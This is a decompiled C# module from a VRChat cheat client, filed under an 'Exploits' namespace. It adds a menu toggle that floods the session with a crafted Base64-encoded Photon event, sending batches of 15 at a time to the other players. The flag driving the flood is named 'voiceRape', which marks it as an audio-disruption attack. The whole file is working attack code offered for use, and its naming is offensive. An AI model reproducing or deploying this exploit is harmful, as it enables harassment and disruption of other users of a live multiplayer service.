using System;
using System.Collections;
using ExitGames.Client.Photon;
using Il2CppSystem;
using Kernel.Resources.Extensions;
using KernelClient.Wrapper;
using MelonLoader;
using Photon.Pun;
using Photon.Realtime;
using UnityEngine;
using VRC.SDKBase;

namespace KernelClient.Modules.Exploits.EONECOLLECTION
{
	// Token: 0x020000B0 RID: 176
	internal class NE1 : KernelModule
	{
		// Token: 0x060004AB RID: 1195 RVA: 0x00003ACE File Offset: 0x00001CCE
		public override void OnUiManagerInit()
		{
			MenuSetup._uiManager.QMMenu.GetCategoryPage(PageNames.Exploits).GetCategory(CatagoryNames.EONEcollection).AddToggle("HE1", "HE1 ", delegate(bool isActive)
			{
				this.voiceRape = isActive;
				bool flag = this.voiceRape;
				if (flag)
				{
					this.StartEventLoop();
				}
			}, false);
		}

		// Token: 0x060004AC RID: 1196 RVA: 0x00003B0C File Offset: 0x00001D0C
		private void StartEventLoop()
		{
			MelonCoroutines.Start(this.SendVOREvents());
		}

		// Token: 0x060004AD RID: 1197 RVA: 0x0001B244 File Offset: 0x00019444
		private IEnumerator SendVOREvents()
		{
			byte[] array = Convert.FromBase64String("AQAAAOxnk8cADjsA+H3owCVgPq4w5B67lcSx14zff9FCPAAgS0VNT05PLlBFVCBYIElOVkFMSUQuR0cgICAgICnAJWA+rjA=");
			try
			{
				Buffer.BlockCopy(BitConverter.GetBytes(VRCPlayer.field_Internal_Static_VRCPlayer_0.Method_Public_get_VRCPlayerApi_0().playerId), 0, array, 0, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(Networking.GetServerTimeInMilliseconds()), 0, array, 4, 4);
			}
			catch (Exception ex)
			{
				MelonLogger.Error(string.Format("Error during array modification: {0}", ex));
			}
			Object @object = SerializationUtils.FromManagedToIL2CPP<Object>(array);
			while (this.voiceRape)
			{
				try
				{
					float time = Time.time;
					for (int i = 0; i < 15; i++)
					{
						bool flag = this.voiceRape;
						if (flag)
						{
							NE1.OpRaiseEvent(1, @object, new RaiseEventOptions
							{
								field_Public_EventCaching_0 = 0,
								field_Public_ReceiverGroup_0 = 0
							}, default(SendOptions));
						}
					}
					float num = 0.21f;
					bool flag2 = Time.time < time + num;
					if (flag2)
					{
						return null;
					}
				}
				catch (Exception ex2)
				{
					MelonLogger.Error(string.Format("Error during event sending: {0}", ex2));
				}
			}
			return null;
		}

		// Token: 0x060004AE RID: 1198 RVA: 0x0001B378 File Offset: 0x00019578
		public static void OpRaiseEvent(byte code, object customObject, RaiseEventOptions RaiseEventOptions, SendOptions sendOptions)
		{
			try
			{
				Object @object = SerializationUtils.FromManagedToIL2CPP<Object>(customObject);
				NE1.OpRaiseEvent(code, @object, RaiseEventOptions, sendOptions);
			}
			catch (Exception ex)
			{
				string text = "[KE1 Module] Error in OpRaiseEvent (CustomObject Conversion): ";
				Exception ex2 = ex;
				MelonLogger.Error(text + ((ex2 != null) ? ex2.ToString() : null));
			}
		}

		// Token: 0x060004AF RID: 1199 RVA: 0x0001B3D0 File Offset: 0x000195D0
		public static void OpRaiseEvent(byte code, Object customObject, RaiseEventOptions RaiseEventOptions, SendOptions sendOptions)
		{
			try
			{
				PhotonNetwork.Method_Public_Static_Boolean_Byte_Object_RaiseEventOptions_SendOptions_0(code, customObject, RaiseEventOptions, sendOptions);
			}
			catch (Exception ex)
			{
				string text = "[KE1 Module] Error in OpRaiseEvent (Photon Event): ";
				Exception ex2 = ex;
				MelonLogger.Error(text + ((ex2 != null) ? ex2.ToString() : null));
			}
		}

		// Token: 0x0400032E RID: 814
		private bool voiceRape = false;

		// Token: 0x0400032F RID: 815
		private Random random = new Random();

		// Token: 0x04000330 RID: 816
		private float lastEventTime = 0f;
	}
}
